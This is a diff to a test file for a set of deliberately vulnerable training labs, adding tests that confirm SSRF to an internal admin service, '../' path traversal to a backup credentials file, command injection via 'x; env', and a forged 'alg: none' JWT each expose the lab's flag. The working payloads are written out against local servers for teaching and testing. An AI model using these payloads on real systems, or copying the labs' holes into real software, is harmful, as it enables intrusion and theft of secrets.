@@ -12,9 +12,9 @@ afterAll(() => {
   for (const p of running) p.kill();
 });
 
-async function lab(name: string, flag: string): Promise<string> {
+async function lab(name: string, flag: string, extraEnv: Record<string, string> = {}): Promise<string> {
   const child = spawn(process.execPath, ['--disable-warning=ExperimentalWarning', `labs/${name}/server.mjs`], {
-    env: { PATH: process.env.PATH, FLAG: flag, PORT: '0', HOST: '127.0.0.1' },
+    env: { PATH: process.env.PATH, FLAG: flag, PORT: '0', HOST: '127.0.0.1', ...extraEnv },
     stdio: ['ignore', 'pipe', 'inherit'],
   });
   running.push(child);
@@ -44,7 +44,7 @@ const json = (body: unknown, token?: string) => ({
 const bearer = (token: string) => ({ headers: { authorization: `Bearer ${token}` } });
 
 describe('labs refuse to start without a flag', () => {
-  it.each(['sqli-login', 'idor-invoices', 'mass-assignment'])('%s', async (name) => {
+  it.each(['sqli-login', 'idor-invoices', 'mass-assignment', 'ssrf-preview', 'path-traversal', 'command-injection', 'jwt-none'])('%s', async (name) => {
     const child = spawn(process.execPath, [`labs/${name}/server.mjs`], { env: { PATH: process.env.PATH }, stdio: 'ignore' });
     expect(await new Promise((resolve) => child.on('exit', resolve))).toBe(1);
   });
@@ -98,5 +98,55 @@ describe('lab mass-assignment', () => {
     };
     const report = (await (await fetch(`${base}/api/admin/rapport`, bearer(evil.jeton))).json()) as { flag: string };
     expect(report.flag).toBe(flag);
+  });
+});
+
+describe('lab ssrf-preview', () => {
+  it('previews public pages; pointing it at its own loopback reaches the internal admin service', async () => {
+    const flag = newFlag();
+    const internalPort = String(20_000 + Math.floor(Math.random() * 20_000));
+    const base = await lab('ssrf-preview', flag, { INTERNAL_PORT: internalPort });
+    const home = await (await fetch(`${base}/`)).text();
+    expect(home).not.toContain(flag);
+    expect((await fetch(`${base}/apercu?url=file:///etc/passwd`)).status).toBe(400);
+    const internal = `http://127.0.0.1:${internalPort}/admin/config`;
+    expect(await (await fetch(`${base}/apercu?url=${encodeURIComponent(internal)}`)).text()).toContain(flag);
+  });
+});
+
+describe('lab path-traversal', () => {
+  it('serves its public documents, and "../" walks out of the folder to the backup credentials', async () => {
+    const flag = newFlag();
+    const base = await lab('path-traversal', flag);
+    const honest = await (await fetch(`${base}/telecharger?fichier=planning-conges.txt`)).text();
+    expect(honest).toMatch(/Planning/);
+    expect(honest).not.toContain(flag);
+    expect(await (await fetch(`${base}/telecharger?fichier=../../secrets/sauvegarde.conf`)).text()).toContain(flag);
+  });
+});
+
+// Needs /bin/sh: runs on Linux (CI) and is checked in its container; skipped on Windows hosts.
+describe.skipIf(process.platform === 'win32')('lab command-injection', () => {
+  it('a domain name gets a lookup; a ";" gets a shell', async () => {
+    const flag = newFlag();
+    const base = await lab('command-injection', flag);
+    expect(await (await fetch(`${base}/diagnostic?domaine=localhost`)).text()).not.toContain(flag);
+    expect(await (await fetch(`${base}/diagnostic?domaine=${encodeURIComponent('x; env')}`)).text()).toContain(flag);
+  });
+});
+
+describe('lab jwt-none', () => {
+  it('a guest token is refused the secrets; the same claims with "alg": "none" and no signature are accepted', async () => {
+    const flag = newFlag();
+    const base = await lab('jwt-none', flag);
+    const { jeton } = (await (await fetch(`${base}/api/invite`, { method: 'POST' })).json()) as { jeton: string };
+    expect((await fetch(`${base}/api/admin/secrets`, bearer(jeton))).status).toBe(403);
+    // Tampering with a signed token is caught: the signature is checked when alg is HS256.
+    const [head, , sig] = jeton.split('.');
+    const admin = Buffer.from(JSON.stringify({ sub: 'x', role: 'admin' })).toString('base64url');
+    expect((await fetch(`${base}/api/admin/secrets`, bearer(`${head ?? ''}.${admin}.${sig ?? ''}`))).status).toBe(401);
+    const none = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
+    const res = (await (await fetch(`${base}/api/admin/secrets`, bearer(`${none}.${admin}.`))).json()) as { secret: string };
+    expect(res.secret).toBe(flag);
   });
 });
